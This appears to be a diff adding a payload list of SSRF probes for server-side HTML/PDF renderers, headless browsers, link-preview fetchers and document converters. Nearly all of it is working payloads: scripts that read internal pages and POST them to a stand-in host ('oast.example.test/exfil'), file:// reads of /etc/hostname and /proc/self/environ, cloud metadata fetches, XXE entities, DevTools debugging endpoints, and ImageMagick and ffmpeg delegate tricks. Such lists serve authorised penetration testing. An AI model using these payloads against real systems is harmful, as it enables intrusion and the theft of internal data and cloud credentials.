@@ -1,0 +1,117 @@
+# SSRF via HTML/PDF Renderers, Headless Browsers and Document Converters
+# Content processed server-side by a browser engine or converter. Place in a field that is rendered to PDF/image or fetched for a preview. Replace oast.example.test.
+
+# Basic outbound-interaction probes (HTML content rendered server-side)
+<img src="http://oast.example.test/render-img">
+<link rel="stylesheet" href="http://oast.example.test/render.css">
+<script src="http://oast.example.test/render.js"></script>
+<iframe src="http://oast.example.test/render-frame"></iframe>
+<object data="http://oast.example.test/render-object"></object>
+<embed src="http://oast.example.test/render-embed">
+<video src="http://oast.example.test/render-video"></video>
+<audio src="http://oast.example.test/render-audio"></audio>
+<img srcset="http://oast.example.test/render-srcset 1x">
+<picture><source srcset="http://oast.example.test/render-picture"><img src=x></picture>
+<body background="http://oast.example.test/render-bg">
+<input type="image" src="http://oast.example.test/render-input">
+<svg><image href="http://oast.example.test/render-svg"/></svg>
+<style>@import url(http://oast.example.test/render-import.css);</style>
+<div style="background:url(http://oast.example.test/render-css)">x</div>
+<style>@font-face{font-family:x;src:url(http://oast.example.test/render-font)}body{font-family:x}</style>
+<meta http-equiv="refresh" content="0;url=http://oast.example.test/render-refresh">
+<base href="http://oast.example.test/">
+<form action="http://oast.example.test/render-form" method="post"><input name="a" value="b"></form><script>document.forms[0].submit()</script>
+
+# JavaScript in the renderer: read internal responses and send them out
+<script>fetch('http://127.0.0.1/').then(r=>r.text()).then(t=>fetch('http://oast.example.test/exfil',{method:'POST',body:t}))</script>
+<script>var x=new XMLHttpRequest();x.open('GET','http://127.0.0.1/',false);x.send();document.body.innerText=x.responseText</script>
+<script>document.write('<iframe src="http://127.0.0.1/" width=800 height=600>')</script>
+<script>document.write(location.href+' | '+document.domain)</script>
+<script>document.write(navigator.userAgent)</script>
+<script>document.write(document.cookie)</script>
+<script>document.write(window.location.protocol+'//'+window.location.host)</script>
+<script>document.write(typeof process!=='undefined'?'node':'browser')</script>
+<script>new Image().src='http://oast.example.test/js?ua='+encodeURIComponent(navigator.userAgent)</script>
+
+# Local file read through the renderer (file:// handling differs per tool)
+<iframe src="file:///etc/hostname" width="800" height="200"></iframe>
+<embed src="file:///etc/hostname" width="800" height="200">
+<object data="file:///etc/hostname" width="800" height="200"></object>
+<img src="file:///etc/hostname">
+<link rel="attachment" href="file:///etc/hostname">
+<annotation file="/etc/hostname" content="/etc/hostname" icon="Graph" title="Attached File: /etc/hostname" pos-x="195"/>
+<script>x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open('GET','file:///etc/hostname');x.send()</script>
+<script>document.write('<iframe src=file:///etc/hostname></iframe>')</script>
+<iframe src="file:///C:/Windows/win.ini" width="800" height="200"></iframe>
+<iframe src="file:///proc/self/environ" width="800" height="200"></iframe>
+
+# Cloud metadata via the renderer
+<iframe src="http://169.254.169.254/latest/meta-data/" width="800" height="400"></iframe>
+<script>fetch('http://169.254.169.254/latest/meta-data/').then(r=>r.text()).then(t=>document.write(t))</script>
+<iframe src="http://metadata.google.internal/computeMetadata/v1/?recursive=true" width="800" height="400"></iframe>
+<iframe src="http://169.254.169.254/metadata/instance?api-version=2021-02-01" width="800" height="400"></iframe>
+
+# DNS rebinding and redirect-based bypass of an allow-list that checks only the first URL
+<iframe src="http://rebind.oast.example.test/"></iframe>
+<iframe src="http://oast.example.test/redirect-to-internal"></iframe>
+<img src="http://oast.example.test/redirect?to=http://127.0.0.1/">
+# redirect fixture: respond 302 with Location: http://169.254.169.254/latest/meta-data/ (observe whether the renderer follows)
+
+# wkhtmltopdf (legacy WebKit): local file inclusion via XHR and iframe (version-dependent behaviour)
+<iframe src="file:///etc/hostname"></iframe>
+--disable-local-file-access
+
+# Headless Chrome / Puppeteer / Playwright: navigation and DevTools exposure
+chrome://version
+about:blank
+view-source:http://127.0.0.1/
+http://127.0.0.1:9222/json
+http://127.0.0.1:9222/json/version
+http://localhost:9222/json/list
+ws://127.0.0.1:9222/devtools/browser/
+http://127.0.0.1:9229/json
+javascript:document.title='render-marker'
+data:text/html,<script>document.title='render-marker'</script>
+--remote-debugging-port=9222
+--no-sandbox
+--disable-web-security
+--allow-file-access-from-files
+
+# Link preview / unfurl / URL import fetchers (server fetches a URL and parses metadata)
+http://oast.example.test/preview
+http://oast.example.test/preview.html with <meta property="og:image" content="http://127.0.0.1/">
+http://oast.example.test/preview.html with <link rel="icon" href="http://127.0.0.1/">
+http://oast.example.test/oembed.json
+http://oast.example.test/feed.xml
+http://oast.example.test/sitemap.xml
+http://oast.example.test/redirect-to-internal
+http://oast.example.test/slow-response (hold the connection open to detect timeouts)
+http://oast.example.test/large-response (large body to detect size limits)
+
+# SVG, XML and document formats that trigger fetches
+<svg xmlns="http://www.w3.org/2000/svg"><image href="http://oast.example.test/svg-image"/></svg>
+<svg xmlns="http://www.w3.org/2000/svg"><use href="http://oast.example.test/ext.svg#a"/></svg>
+<svg xmlns="http://www.w3.org/2000/svg"><foreignObject><iframe xmlns="http://www.w3.org/1999/xhtml" src="http://127.0.0.1/"/></foreignObject></svg>
+<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "http://oast.example.test/doc-xxe">]><r>&x;</r>
+<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:body><w:p><w:r><w:t>docx-marker</w:t></w:r></w:p></w:body></w:document>
+{\rtf1{\field{\*\fldinst INCLUDEPICTURE "http://oast.example.test/rtf-marker"}}}
+
+# Markdown and Office-to-PDF fixtures
+![x](http://oast.example.test/md-image)
+[x](http://oast.example.test/md-link)
+<img src="http://oast.example.test/md-html">
+=IMAGE("http://oast.example.test/sheet-image")
+=HYPERLINK("http://oast.example.test/sheet-link","x")
+
+# ImageMagick / Ghostscript / ffmpeg delegates reaching the network (see also Command-Injection/argument-injection-payloads.txt)
+push graphic-context
+viewbox 0 0 640 480
+fill 'url(http://oast.example.test/magick-marker.jpg)'
+pop graphic-context
+#EXTM3U
+#EXT-X-MEDIA-SEQUENCE:0
+#EXTINF:1.0,
+http://oast.example.test/ffmpeg-marker.ts
+#EXT-X-ENDLIST
+%!PS-Adobe-3.0 EPSF-3.0
+%%BoundingBox: 0 0 100 100
